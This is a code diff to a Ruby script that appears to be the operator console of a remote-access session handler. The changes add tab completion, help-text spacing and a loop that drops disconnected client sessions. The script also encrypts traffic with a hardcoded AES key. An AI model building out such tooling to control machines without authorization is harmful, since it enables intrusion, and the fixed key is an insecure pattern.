@@ -1,6 +1,7 @@
 #!/usr/bin/env ruby
 require 'openssl'
 require 'base64'
+require 'readline'
 module MainCommands
   def print_error(text)
 	  print "\e[31m[-]\e[0m #{text}"
@@ -26,11 +27,28 @@ module MainCommands
 		command_client(client)
 	end
 	def help()
-		print "list_sessions\tlist active sessions\nbackground\tput session in the background\nuse_session\tuse a session\nexit\t\texit program\nhelp\t\tthis page\n"
+		print "\nlist_sessions\tlist active sessions\nbackground\tput session in the background\nuse_session\tuse a session\nexit\t\texit program\nhelp\t\tthis page\n\n"
 		main_shell()
 	end
 	def exit()
 
+	end
+	def client_status(client_array,client_hash)
+		loop {
+		  client_array.each do |client|
+			  array_index = client_array.index(client)
+			  next if client == nil
+		    if client.closed?
+			    print_info("#{client_hash[:"#{array_index}"]} left\n")
+				  client_hash.delete(:"#{array_index}")
+          client_array.delete_at(array_index)
+			    client_array.insert(array_index,nil)
+		    end
+      end
+			sleep(1)
+		}
+	  rescue => e
+			puts e
 	end
 	@aes = OpenSSL::Cipher.new("AES-256-CFB")
 	@key = 'abcdefghijklmnopqrstuvwxyz123456'
@@ -51,4 +69,7 @@ module MainCommands
 		decrypt_data = @aes.update(decode_data) + @aes.final
 		return decrypt_data
 	end
+	LIST = ['background','list_sessions','use_session','help','exit'].sort
+  comp = proc { |s| LIST.grep(/^#{Regexp.escape(s)}/) }
+	Readline.completion_proc = comp
 end
